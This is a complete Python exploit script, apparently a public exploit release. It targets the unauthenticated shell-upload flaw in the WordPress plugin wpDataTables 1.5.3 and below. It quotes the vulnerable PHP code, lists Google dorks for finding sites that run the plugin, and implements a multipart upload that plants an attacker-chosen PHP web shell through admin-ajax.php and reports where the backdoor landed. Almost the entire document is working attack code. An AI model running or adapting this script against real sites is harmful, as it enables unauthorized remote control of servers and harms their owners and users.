#!/usr/bin/python
#
# Exploit Name: Wordpress wpDataTables 1.5.3 and below Unauthenticated Shell Upload Vulnerability
# 
# Vulnerability discovered by Claudio Viviani
#
# Date : 2014-11-22
#
# Exploit written by Claudio Viviani
#
# Video Demo: https://www.youtube.com/watch?v=44m4VNpeEVc
#
# --------------------------------------------------------------------
#
# Issue n.1 (wpdatatables.php)
#
# This function is always available without wpdatatables edit permission:
#
#    function wdt_upload_file(){
#        require_once(PDT_ROOT_PATH.'lib/upload/UploadHandler.php');
#        $uploadHandler = new UploadHandler();
#        exit();
#    }
#    ...
#    ...
#    ...
#    add_action( 'wp_ajax_wdt_upload_file', 'wdt_upload_file' );
#    add_action( 'wp_ajax_nopriv_wdt_upload_file', 'wdt_upload_file' );
# 
#
# Issue n.2 (lib/upload/UploadHandler.php)
#
# This php script allows you to upload any type of file
#
# ---------------------------------------------------------------------
#
# Dork google:  inurl:/plugins/wpdatatables
#               inurl:codecanyon-3958969
#               index of "wpdatatables"
#               index of "codecanyon-3958969"
#
# Tested on BackBox 3.x
#
#
# http connection
import urllib, urllib2, sys, re
# Args management
import optparse
# file management
import os, os.path

# Check url
def checkurl(url):
    if url[:8] != "https://" and url[:7] != "http://":
        print('[X] You must insert http:// or https:// procotol')
        sys.exit(1)
    else:
        return url

# Check if file exists and has readable
def checkfile(file):
    if not os.path.isfile(file) and not os.access(file, os.R_OK):
        print '[X] '+file+' file is missing or not readable'
        sys.exit(1)
    else:
        return file

# Create multipart header
def create_body_sh3ll_upl04d(payloadname):

   getfields = dict()

   payloadcontent = open(payloadname).read()

   LIMIT = '----------lImIt_of_THE_fIle_eW_$'
   CRLF = '\r\n'

   L = []
   for (key, value) in getfields.items():
      L.append('--' + LIMIT)
      L.append('Content-Disposition: form-data; name="%s"' % key)
      L.append('')
      L.append(value)

   L.append('--' + LIMIT)
   L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % ('files[]', payloadname))
   L.append('Content-Type: application/force-download')
   L.append('')
   L.append(payloadcontent)
   L.append('--' + LIMIT + '--')
   L.append('')
   body = CRLF.join(L)
   return body

banner = """
   ___ ___               __                                                         
  |   Y   .-----.----.--|  .-----.----.-----.-----.-----.                           
  |.  |   |  _  |   _|  _  |  _  |   _|  -__|__ --|__ --|                           
  |. / \  |_____|__| |_____|   __|__| |_____|_____|_____|                           
  |:      |                |__|                                                     
  |::.|:. |                                                                         
  `--- ---'                                                                         
         ___ ___       ______         __         _______       __    __                
        |   Y   .-----|   _  \ .---.-|  |_.---.-|       .---.-|  |--|  .-----.-----.   
        |.  |   |  _  |.  |   \|  _  |   _|  _  |.|   | |  _  |  _  |  |  -__|__ --|   
        |. / \  |   __|.  |    |___._|____|___._`-|.  |-|___._|_____|__|_____|_____|   
        |:      |__|  |:  1    /                  |:  |                                
        |::.|:. |     |::.. . /                   |::.|                                
        `--- ---'     `------'                    `---'                                
                                                 
                                                        Sh311 Upl04d Vuln3r4b1l1ty 
                                                                <= 1.5.3

                                   Written by:

                                 Claudio Viviani

                              http://www.homelab.it

                                 info@homelab.it
                             homelabit@protonmail.ch

                        https://www.facebook.com/homelabit
                          https://twitter.com/homelabit
                          https://plus.google.com/+HomelabIt1/
               https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
"""

commandList = optparse.OptionParser('usage: %prog -t URL -f FILENAME.PHP [--timeout sec]')
commandList.add_option('-t', '--target', action="store",
                  help="Insert TARGET URL: http[s]://www.victim.com[:PORT]",
                  )
commandList.add_option('-f', '--file', action="store",
                  help="Insert file name, ex: shell.php",
                  )
commandList.add_option('--timeout', action="store", default=10, type="int",
                  help="[Timeout Value] - Default 10",
                  )

options, remainder = commandList.parse_args()

# Check args
if not options.target or not options.file:
    print(banner)
    commandList.print_help()
    sys.exit(1)

payloadname = checkfile(options.file)
host = checkurl(options.target)
timeout = options.timeout

print(banner)

url_wpdatatab_upload = host+'/wp-admin/admin-ajax.php?action=wdt_upload_file'

content_type = 'multipart/form-data; boundary=----------lImIt_of_THE_fIle_eW_$'

bodyupload = create_body_sh3ll_upl04d(payloadname)

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
           'content-type': content_type,
           'content-length': str(len(bodyupload)) }

try:
   req = urllib2.Request(url_wpdatatab_upload, bodyupload, headers)
   response = urllib2.urlopen(req)

   read = response.read()

   if "error" in read or read == "0":
      print("[X] Upload Failed :(")
   else:
      backdoor_location = re.compile('\"url\":\"(.*?)\",\"').search(read).group(1)
      print("[!] Shell Uploaded")
      print("[!] Location: "+backdoor_location.replace("\\",""))
except urllib2.HTTPError as e:
   print("[X] Http Error: "+str(e))
except urllib2.URLError as e:
   print("[X] Connection Error: "+str(e))